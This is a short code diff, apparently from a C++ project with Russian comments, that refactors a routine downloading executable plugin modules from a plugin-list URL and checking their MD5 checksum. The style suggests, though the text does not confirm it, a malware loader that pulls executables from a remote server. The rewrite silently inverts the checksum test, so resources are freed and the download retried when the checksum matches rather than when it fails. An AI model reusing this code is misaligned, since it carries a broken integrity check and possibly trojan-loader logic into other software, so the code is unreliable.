@@ -692,8 +692,7 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
 		// сигнатуру
 
-		char CalculatedMd5[40];
-		CalcMd5SummFromBuffer(Buffer, BufSize, CalculatedMd5, sizeof(CalculatedMd5));
+		string CalculatedMd5 = MD5StrFromBuf(Buffer, BufSize);
 
 		LPBYTE Module = NULL;
 
@@ -710,16 +709,13 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 
 		// Если файл был выкачан и была получена MD5 - проверяем MD5 сумму.
 		// Если контрольная сумма не совпала - пробуем подгрузить всё заново.
-		if (ReceivedMd5 != NULL && Module != NULL)
+		if (ReceivedMd5 && Module)
 		{
-			DWORD Md5CompareResult = m_lstrncmp(ReceivedMd5, CalculatedMd5, 32);
+			bool Valid = CalculatedMd5 == ReceivedMd5;
 
-			PDBG("Plugins", "DownloadEx: r_md5='%s' c_md5='%s' cmp_result=%d.", 
-				ReceivedMd5, CalculatedMd5, Md5CompareResult);
+			STR::Free(ReceivedMd5);
 
-			if (ReceivedMd5 != NULL) STR::Free(ReceivedMd5);
-
-			if (Md5CompareResult != 0)
+			if (Valid)
 			{
 				// Освобождаем ресурсы
 				MemFree(Buffer);
